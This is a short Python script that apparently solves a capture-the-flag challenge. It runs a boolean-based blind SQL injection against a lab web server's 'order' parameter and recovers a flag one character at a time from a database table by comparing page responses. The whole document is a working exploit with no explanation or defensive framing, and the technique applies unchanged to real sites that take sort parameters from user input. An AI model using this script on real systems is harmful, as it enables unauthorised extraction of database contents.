import requests as r

url = "http://10.10.97.14/?order="
query = "case when ( SELECT substr(flag,2,1) = 'l' FROM flag) then title else date end"

rt = r.get(url+"title").text
rd = r.get(url+"date").text
test = "ab}cdef{ghijklmnopqrstuvwxyz0123456789"

print("started ...")


def fun():
    flag = ""
    for i in range(38):
        print(f"looking for index num: {i}")
        for j in test:
            rv = r.get(
                url+f"case when ( SELECT substr(flag,{i+1},1) = '{j}' FROM flag) then title else date end").text
            if rv == rt:
                flag += j
                print(f"Current flag : {flag}")
    return flag


print(fun())
